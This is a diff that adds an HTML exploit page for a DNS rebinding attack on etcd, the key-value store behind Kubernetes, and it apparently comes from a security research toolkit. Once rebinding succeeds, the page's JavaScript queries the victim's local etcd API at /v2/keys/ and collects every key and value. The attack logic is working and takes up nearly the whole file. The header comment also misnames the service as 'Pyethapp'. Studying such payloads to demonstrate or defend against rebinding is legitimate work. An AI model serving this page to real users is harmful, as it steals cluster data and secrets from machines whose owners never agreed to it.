@@ -1,0 +1,60 @@
+<!--
+This payload is exploiting etcd (https://github.com/coreos/etcd), a key-value store used in Kubernetes for storing all cluster data.
+The exploit performs one GET request (http://localhost:2379/v2/keys/) to retrieve all keys and displays them.
+The default API port for Pyethapp is TCP 2379 (localhost:2379).
+-->
+<!doctype html>
+<html>
+<head>
+	<title>etcd DNS Rebinding Attack</title>
+	<script src="payload.js"></script>
+	<script>
+	var timer;
+	var interval = 60000;
+	var address;
+
+	function attack() {
+		/* /v2/keys/ : Send a GET request to get the list of keys and values */
+		fetch('/v2/keys/', {})
+			.then(responseOKOrFail("Could not submit a request to get a list of keys"))
+			.then(function (d) { // we successfully received data (the key/value pairs)
+				clearInterval(timer);
+				console.log("raw json: "+d);
+				data = JSON.parse(d); // parse JSON server response
+				nodes = data.node.nodes; // get the nodes array with the key / value pairs
+	            console.log("Number of keys: "+nodes.length);
+				var result = '\n';
+				for (var i = 0; i < nodes.length ; i++ ) {
+					console.log("key: " + nodes[i].key + " value: " + nodes[i].value);
+					result = result+"key: " + nodes[i].key + " value: " + nodes[i].value+"\n"
+    	         }
+				attackSuccess("Your keys and values: "+result);
+			})
+			.catch(function (error) {
+				if (error instanceof TypeError) { // We cannot establish an HTTP connection
+					console.log("frame " + window.location.hostname + " could not load");
+					window.parent.postMessage({
+						status: "error",
+					}, "*")
+				} else if (error.message == 'hastoken') {
+					console.log('DNS rebinding did not happen yet')
+				} else if (error.message == '404') { // We received a 404
+					console.log("file not found. Frame " + window.location.hostname +
+						" has not updated dns yet, waiting " + interval +
+						" ms")
+				} else { // We did not handle something
+					console.log('Unhandled error: ' + error);
+				}
+			});
+		}
+	</script>
+</head>
+<body onload="begin()">
+    <p>
+        <h3>DNS Rebinding Vulnerability in etcd</h3>
+    </p>
+    <p>
+        This page is waiting for a dns update.
+    </p>
+</body>
+</html>
